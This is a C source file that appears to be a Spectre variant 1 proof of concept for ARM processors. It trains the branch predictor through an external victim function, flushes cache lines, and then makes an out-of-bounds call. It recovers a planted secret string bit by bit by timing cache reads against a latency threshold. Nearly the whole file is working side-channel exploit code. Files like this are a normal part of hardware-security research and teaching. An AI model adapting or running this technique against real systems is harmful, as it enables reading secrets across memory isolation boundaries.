//#pragma GCC push_options
//#pragma GCC optimize ("O0")
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <stdint.h>
#include "armpmu_lib.h"
#include <unistd.h>

#define OOB_READ 200				// Number of byte read
#define ARRAY_SIZE 31			// Array1 size
#define FAKE_SIZE 13
#define SAME_BIT_CYCLES 10		// Number of reading tries on the same byte
#define CACHE_LINES 128
#define N_OF_BITS 8 			//number of bits in a byte
#define LATENCY_THRESHOLD	60
#define SB 13					// Start Byte from array1 for the out of bound read
#define LINE_DISTANCE 64*64
#define ARRAY2_SIZE 256*64

extern void victimCode(int* array1_size,char* array1,char* array2,long int junk,int x);
extern long int Flush(long int line);

// Victim variables
char array1[]="0123456789012secretStringArray1";
char s[]="S3CRET5TR0NGs";
char array2[ARRAY2_SIZE];
int array1_size = FAKE_SIZE;

// Attacker variables
int x;

int junk; // Used when reading cache latency, and also when passing the bit number to the victim

// Variable for byte read from cache side channel
uint32_t start,end;
//int temp=0; // Not to optimize the access to array2 during cache timing read
uint32_t timings[OOB_READ][N_OF_BITS][2]; // first index to scan reads of different bytes, second one to scan the single byte and find a bit, the third one for the value of the timing for the single bit
char byte_read,bit_read;

// Just indexes
int i,j,k,m,l;

// Cache timings file
FILE* fout;

int main(void){

	// Timing matrix initialization
	for(i=0;i<OOB_READ;i++){
		for(j=0;j<N_OF_BITS;j++){
			timings[i][j][0]=0;
            		timings[i][j][1]=0;
        	}
    	}

	// Byte read
	for(i=0,x=SB;i<OOB_READ;i++,x++){ //to scan over different reads
		byte_read=0;

	  for(m=0;m<N_OF_BITS;m++){ // to read a single byte one bit at a time
		// SAME_BYTE_CYCLES tries for each byte

  	  for(j=0;j<SAME_BIT_CYCLES;j++){ // to reread the bit multiple times, just to be safe
			// Mistraining

          victimCode(&array1_size, array1, array2, m, 0);
          victimCode(&array1_size, array1, array2, m, 1);
          victimCode(&array1_size, array1, array2, m, 2);
          victimCode(&array1_size, array1, array2, m, 3);
          victimCode(&array1_size, array1, array2, m, 4);
          victimCode(&array1_size, array1, array2, m, 5);
          victimCode(&array1_size, array1, array2, m, 6);
          victimCode(&array1_size, array1, array2, m, 7);
          victimCode(&array1_size, array1, array2, m, 8);
          victimCode(&array1_size, array1, array2, m, 9);
          victimCode(&array1_size, array1, array2, m, 10);
          victimCode(&array1_size, array1, array2, m, 11);
          victimCode(&array1_size, array1, array2, m, 12);

          // Flush
          for(k=0;k<ARRAY2_SIZE;k++)
            Flush(&array2[k]);

          for(k=0;k<ARRAY_SIZE;k++)
            Flush(&array1[k]);

          for(k=0;k<OOB_READ;k++)
            for(l=0;l<N_OF_BITS;l++){
              Flush(&timings[k][l][0]);
              Flush(&timings[k][l][1]);
            }

          Flush(&array1_size);
          asm volatile( 	"nop				\t\n");
          asm volatile( 	"nop				\t\n");
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );
          asm volatile(	"cmn sp,#0			\t\n"
                        "beq 8			 	\t\n"
                        "nop				\t\n" );

          // Call using malicious x
          victimCode(&array1_size, array1, array2, m, x);

          for(k=0;k<2;k++){
             // Non-cached read
             junk=k*LINE_DISTANCE; //64 is the size of a cache line
             start=rdtsc32();
             junk &= array2[junk];
             end=rdtsc32();
             timings[i][m][k]+=end-start;
          }
     }

  	// Avg timing for each cache line read
     for(k=0;k<2;k++){
        timings[i][m][k]/=SAME_BIT_CYCLES;
        if(timings[i][m][1]<LATENCY_THRESHOLD){		// If bit=0 the value is already set since byte_read is initialized to 0
          bit_read = 0x1 << m;
          byte_read |= bit_read;
        }
     }
   }
   printf("%c",byte_read);
 }
 printf("\n");

 return 0;
}

//#pragma GCC pop_options
